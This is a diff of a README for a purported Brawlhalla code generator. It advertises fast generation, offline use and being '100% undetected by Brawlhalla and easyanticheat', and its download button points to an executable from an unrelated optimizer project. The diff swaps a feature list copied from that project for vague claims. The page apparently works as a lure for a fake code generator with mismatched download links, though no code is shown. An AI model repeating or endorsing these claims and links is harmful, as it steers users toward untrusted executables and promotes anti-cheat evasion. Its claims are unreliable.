@@ -13,26 +13,12 @@ Brawlgen is recommended if you wan't to generate codes fast and safe.
 	<a href="https://github.com/hellzerg/optimizer/releases/download/12.7/Optimizer-12.7.exe" target="_blank">
 		<img src="https://raw.githubusercontent.com/hellzerg/optimizer/master/download-button.png">
 
-* Insanely fast generating
+* Lightning speed generating
 * Lightweight cpu usage
-* Completely offline no wifi needed to use
-* Advanced security 100% undetected by Brawlhalla and easyanticheat
-
-* Disable Windows 10 automatic updates
-* Download useful apps quickly at once
-* Uninstall UWP apps
-* Clean your system drive and major browsers' profile data
-* Fix common registry issues
-* Ping IPs and assess your latency
-* Search IPs on SHODAN.io
-* Flush DNS cache
-* Remove unwanted programs running at startup
-* Edit your HOSTS file
-* Network speed monitoring
-* Hardware inspection tool
-* Add items in desktop on right-click menu
-* Define custom commands for run dialog
-* Silent run support using a configuration file
+* Completely offline no wifi needed
+* Advanced security system 100% undetected
+* Frequent updates by the community
+* Download useful improved beta versions that are made by co-developers
 
 ## Downloads: ##
 https://github.com/Aysur/Brawlhalla-Code-Generator/releases
